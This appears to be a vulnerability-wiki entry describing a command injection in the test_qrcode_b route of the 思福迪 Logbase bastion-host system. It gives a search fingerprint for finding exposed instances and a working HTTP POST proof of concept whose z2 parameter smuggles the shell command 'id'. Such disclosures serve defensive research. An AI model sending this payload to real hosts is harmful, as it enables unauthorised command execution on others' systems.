---
source: "Threekiii/Vulnerability-Wiki"
title: "思福迪Logbase运维安全管理 test_qrcode_b z2命令注入"
product: "思福迪Logbase运维安全管理"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；shell拼接环境"
prerequisites: "无Cookie示例，权限待核"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/Threekiii/Vulnerability-Wiki"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%80%9D%E7%A6%8F%E8%BF%AA/%E6%80%9D%E7%A6%8F%E8%BF%AA-%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-test_qrcode_b-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
id: "vw-745b86126c9cb947d9e93a11"
entity_id: "ve-745b86126c9cb947d9e93a11"
schema_version: "1"
---

# 思福迪Logbase运维安全管理 test_qrcode_b z2命令注入

## 条目说明

- 对象与具体问题：思福迪Logbase运维安全管理；test_qrcode_b z2命令注入
- 版本、配置及部署条件：版本未知；shell拼接环境
- 认证与权限前提：无Cookie示例，权限待核
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 结果只截图未视检，缺源码/修复与版本

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

### 漏洞描述

思福迪运维安全管理系统是思福迪开发的一款运维安全管理堡垒机。思福迪运维安全管理系统 test_qrcode_b 路由存在命令执行漏洞。

### 漏洞影响

思福迪 运维安全管理系统

### 网络测绘

```
app="思福迪-LOGBASE"
```

### 漏洞复现

登陆页面

![image-20231116142127906](./.resource/思福迪-运维安全管理系统-test_qrcode_b-远程命令执行漏洞/media/image-20231116142127906.png)


poc

```http
POST /bhost/test_qrcode_b HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
Content-Length: 23
Connection: close
Content-Type: application/x-www-form-urlencoded
Referer: http://xxx.xxx.xxx.xxx
Accept-Encoding: gzip

z1=1&z2="|id;"&z3=bhost
```

> 请求长度说明：原资料 Content-Length 为 23；保留原始标头；其数值未据实际请求体重新计算或验证。

![image-20231116142143817](./.resource/思福迪-运维安全管理系统-test_qrcode_b-远程命令执行漏洞/media/image-20231116142143817.png)


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
